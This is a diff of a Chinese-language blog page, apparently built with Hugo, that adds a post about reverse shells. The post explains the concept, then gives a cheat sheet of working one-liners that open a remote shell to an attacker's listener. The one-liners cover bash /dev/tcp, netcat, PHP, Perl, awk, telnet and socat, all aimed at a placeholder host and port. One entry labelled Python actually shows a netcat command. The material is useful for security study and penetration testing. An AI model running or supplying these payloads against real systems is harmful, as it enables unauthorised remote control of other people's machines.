@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html lang="en-us">
   <head>
-    <title>Bubble&#39;s blog</title>
+    <title>反弹shell | Bubble&#39;s blog</title>
 
     <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    
 <meta name="viewport" content="width=device-width,minimum-scale=1">
-<meta name="description" content="blow a bubble">
+<meta name="description" content="">
 <meta name="generator" content="Hugo 0.128.2">
 
 
@@ -46,11 +46,6 @@
 
 
 
-  
-    <link href="/categories/index.xml" rel="alternate" type="application/rss+xml" title="Bubble&#39;s blog" />
-    <link href="/categories/index.xml" rel="feed" type="application/rss+xml" title="Bubble&#39;s blog" />
-  
-
 
 
   </head>
@@ -70,29 +65,152 @@
     
         
         
-            <a class="button" href="https://bubble.wiki/categories/index.xml">Subscribe</a>
-        
     
 </nav>
 
 
     <main class="main">
       
-<header class="profile">
+
+<section id="single">
+    <h1 class="title">反弹shell</h1>
+
+    <div class="tip">
+        <time datetime="0001-01-01 00:00:00 &#43;0000 UTC">Jan 1, 0001</time>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          1121 words
+        </span>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          3 minute read
+        </span>
+    </div>
+
     
-        <img class="avatar" alt="avatar" src="/images/avatar.png" />
+    
+        
+  
+
+
     
 
-    <h1>Bubble&#39;s blog</h1>
+
+    <div class="content">
+      <h2 id="一什么是反弹shell"><strong>一.什么是反弹shell</strong> <a href="#%e4%b8%80%e4%bb%80%e4%b9%88%e6%98%af%e5%8f%8d%e5%bc%b9shell" class="anchor">🔗</a></h2><p>反弹shell(reverse shell)，就是控制端(攻击者所有)监听某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转发到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念上的客户端与服务端的角色反转。</p>
+<p>简单理解：</p>
+<p>正常情况下shell只能由主机的用户使用，但是反弹shell的目的则是将自己的shell反弹给别的主机，让别的主机可以通过shell来控制自己。</p>
+<h2 id="二为什么需要反弹shell"><strong>二.为什么需要反弹shell</strong> <a href="#%e4%ba%8c%e4%b8%ba%e4%bb%80%e4%b9%88%e9%9c%80%e8%a6%81%e5%8f%8d%e5%bc%b9shell" class="anchor">🔗</a></h2><p>反弹 shell 通常是在特定的网络环境下，当攻击者无法直接连接到目标主机时，通过让目标主机主动连接攻击者的机器来建立通信通道，从而实现对目标主机的控制。</p>
+<p>这里我们要理解一下正向连接和反向连接</p>
+<p><strong>正向连接</strong></p>
+<p>通常情况下，攻击者 A 主动去连接目标机器 B。比如攻击者使用远程连接工具直接连接目标机器的开放端口，如通过 SSH 连接目标机器，如果目标机器开放了 SSH 服务并且攻击者知道用户名和密码，就可以从 A 主动连接到 B。</p>
+<p>正向连接的问题在于，如果目标机器 B 有严格的防火墙规则，只允许特定的 IP 或端口连接，或者处于内网中，无法直接从外部访问，那么正向连接可能会失败。</p>
+<p><strong>反向连接</strong></p>
+<p>攻击者 A 在自己的机器上监听一个端口，比如 5555 端口。然后在目标机器 B 上执行特定的命令，让 B 主动连接 A 的 5555 端口。</p>
+<p>反弹shell的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有netcat，那我们就可以利用netcat反弹shell，如果具有python环境，那我们可以利用python反弹shell。如果具有php环境，那我们可以利用php反弹shell。</p>
+<p><strong>三.常见反弹shell方式</strong></p>
+<p><strong>1. Bash反弹shell</strong></p>
+<blockquote>
+<p>Attacker：nc -nvlp port</p>
+</blockquote>
+<blockquote>
+<p>Victim：bash -c &ldquo;bash -i &gt;&amp; /dev/tcp/vpsip/port 0&gt;&amp;1&rdquo;</p>
+</blockquote>
+<p><strong>2. Python反弹shell</strong></p>
+<blockquote>
+<p>Attacker：nc -nvlp port</p>
+</blockquote>
+<blockquote>
+<p>Victim：nc -e /bin/bash vpsip port</p>
+</blockquote>
+<p><strong>3. Php反弹shell</strong></p>
+<blockquote>
+<p>Attacker：nc -nvlp port</p>
+</blockquote>
+<blockquote>
+<p>Victim：php -r &rsquo;exec(&quot;/usr/bin/bash -i &gt;&amp; /dev/tcp/vpsip/port 0&gt;&amp;1&quot;);'</p>
+</blockquote>
+<p>或者：</p>
+<blockquote>
+<p>Victim：php -r &lsquo;$sock=fsockopen(&ldquo;vpsip&rdquo;,port);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&rsquo;</p>
+</blockquote>
+<p><strong>4. exec反弹</strong></p>
+<blockquote>
+<p>Attacker：nc -nvlp port</p>
+</blockquote>
+<blockquote>
+<p>Victim：0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/vpsip/port; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</p>
+</blockquote>
+<p><strong>5. perl反弹</strong></p>
+<blockquote>
+<p>Attacker：nc -nvlp port</p>
+</blockquote>
+<blockquote>
+<p>Victim：perl -e &lsquo;use Socket;$i=&ldquo;vpsip&rdquo;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&ldquo;tcp&rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&rsquo;</p>
+</blockquote>
+<p><strong>6. awk反弹</strong></p>
+<blockquote>
+<p>Attacker：nc -nvlp port</p>
+</blockquote>
+<blockquote>
+<p>Victim：awk &lsquo;BEGIN{s=&quot;/inet/tcp/0/vpsip/port&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)}&rsquo;</p>
+</blockquote>
+<p><strong>7. telnet反弹</strong></p>
+<p>需要在攻击机上分别监听两个端口，执行反弹shell命令后，在port1终端输入命令，port2查看命令执行后的结果</p>
+<blockquote>
+<p>Attacker：</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>nc -nvlp 4567		#输入命令
+</span></span><span style="display:flex;"><span>nc -nvlp 7654		#输出命令
+</span></span></code></pre></div><blockquote>
+<p>Victim：telnet vpsip port1 | /bin/bash | telnet vpsip port2</p>
+</blockquote>
+<p><strong>7. socat反弹</strong></p>
+<blockquote>
+<p>Attacker：nc -nvlp port</p>
+</blockquote>
+<blockquote>
+<p>Victim：socat exec:&lsquo;bash -li&rsquo;,pty,stderr,setsid,sigint,sane tcp:vpsip:port</p>
+</blockquote>
+<p>参考：
+[https://blog.csdn.net/SHELLCODE_8BIT/article/details/124023467]
+[https://blog.csdn.net/weixin_44288604/article/details/111740527]</p>
+    </div>
+
     
     
-      <h2>blow a bubble</h2>
     
-</header>
-<section id="tags">
-      
-      
+  <div id="comment">
+    
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "your-disqus-shortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+  </div>
+
+
 </section>
+
 
     </main>
     
